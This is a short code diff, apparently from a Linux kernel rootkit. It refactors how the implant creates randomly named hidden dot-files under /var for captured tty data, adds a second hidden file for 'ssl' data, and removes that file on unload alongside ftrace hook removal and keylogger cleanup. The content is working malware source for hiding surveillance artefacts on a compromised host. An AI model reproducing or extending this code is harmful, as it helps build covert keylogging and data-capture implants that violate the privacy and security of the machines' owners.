@@ -1062,19 +1062,28 @@ void fh_remove_hooks(struct ftrace_hook *hooks) {
     }
 }
 
-char *sys_ttyfile(void) {
-    static char tty[16];
-    if (*tty == 0) {
+static char *_sys_file(char *prefix, char *file, int len) {
+    if (*file == 0) {
         char tmp[8] = {0};
 
         *tmp = '.';
         snprintf(&tmp[1], 7, "%s", kv_whatever_random_AZ_string(7));
-        snprintf(tty, 15, "/var/%s", tmp);
+        snprintf(file, len-1, "/var/%s", tmp);
         fs_add_name_ro(tmp);
-        prinfo("new tty filename: '%s'\n", tty);
+        prinfo("new %s, filename: '%s'\n", prefix, file);
     }
 
-    return tty;
+    return file;
+}
+
+char *sys_ttyfile(void) {
+    static char tty[16];
+    return _sys_file("var", tty, sizeof(tty));
+}
+
+char *sys_sslfile(void) {
+    static char ssl[16];
+    return _sys_file("tmp", ssl, sizeof(ssl));
 }
 
 bool sys_init(void) {
@@ -1101,6 +1110,11 @@ bool sys_init(void) {
 
 void sys_deinit(void) {
     struct sys_addr_list *sl, *sl_safe;
+    char *ssl = sys_sslfile();
+
+    if (ssl)
+        fs_file_rm(ssl);
+
     fh_remove_hooks(ft_hooks);
     _keylog_cleanup();
 
